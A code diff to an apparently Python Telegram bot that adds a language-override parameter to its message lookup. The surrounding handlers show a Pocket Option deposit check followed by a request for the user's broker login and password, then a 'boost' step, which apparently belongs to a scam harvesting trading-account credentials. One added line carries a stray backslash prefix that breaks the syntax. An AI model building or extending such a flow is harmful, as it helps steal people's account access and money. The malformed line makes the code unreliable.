@@ -68,9 +68,11 @@ def _get_user_lang(user_id: int) -> str:
         return 'uk'
 
 
-def _msg(key: str, user_id: int) -> str:
-    """Fetch message text by key for specific user's language."""
-    lang = _get_user_lang(user_id)
+def _msg(key: str, user_id: int, override_lang: str | None = None) -> str:
+    """Fetch message text by key for specific user's language.
+    If override_lang provided ('ru'|'uk'), it has priority.
+    """
+    lang = (override_lang or _get_user_lang(user_id))
     if lang == 'ru':
         return messages_ru.get(key, messages.get(key, key))
     return messages.get(key, key)
@@ -505,12 +507,13 @@ async def _verify_pocket_option_deposit(message: types.Message, state: FSMContex
     if uid.strip() in test_uids:
         # This is a test user, grant them a test balance and go through normal flow
         await state.update_data(initial_balance=100.0)
+        lang_sel = _get_user_lang(message.from_user.id)
         await send_message_with_photo(
             message=message,
             photo_name="gread need yuor lign password.jpg",
-            text=_msg("pocket_option_verification_successful", message.from_user.id),
+            text=_msg("pocket_option_verification_successful", message.from_user.id, override_lang=lang_sel),
             reply_markup=None,
-            lang=_get_user_lang(message.from_user.id)
+            lang=lang_sel
         )
         await state.set_state(UserFlow.pocket_option_login_input)
         return
@@ -553,12 +556,13 @@ async def _verify_pocket_option_deposit(message: types.Message, state: FSMContex
             pass
         await wait_message.delete()
         # Запрашиваем у пользователя логин и пароль перед продолжением
+        lang_sel = _get_user_lang(message.from_user.id)
         await send_message_with_photo(
             message=message,
             photo_name="gread need yuor lign password.jpg",
-            text=_msg("pocket_option_verification_successful", message.from_user.id),
+            text=_msg("pocket_option_verification_successful", message.from_user.id, override_lang=lang_sel),
             reply_markup=None,
-            lang=_get_user_lang(message.from_user.id)
+            lang=lang_sel
         )
         await state.set_state(UserFlow.pocket_option_login_input)
     else:
@@ -766,7 +770,7 @@ async def pocket_option_login_input_handler(message: types.Message, state: FSMCo
         
         await state.set_state(UserFlow.pocket_option_ready_to_boost)
     else:
-        await message.answer(_msg("invalid_login_format", message.from_user.id), parse_mode="HTML")
+\\        await message.answer(_msg("invalid_login_format", message.from_user.id, override_lang=_get_user_lang(message.from_user.id)), parse_mode="HTML")
 
 @user_router.callback_query(F.data == "start_boost", StateFilter(UserFlow.pocket_option_ready_to_boost))
 async def start_boost_handler(callback: types.CallbackQuery, state: FSMContext):
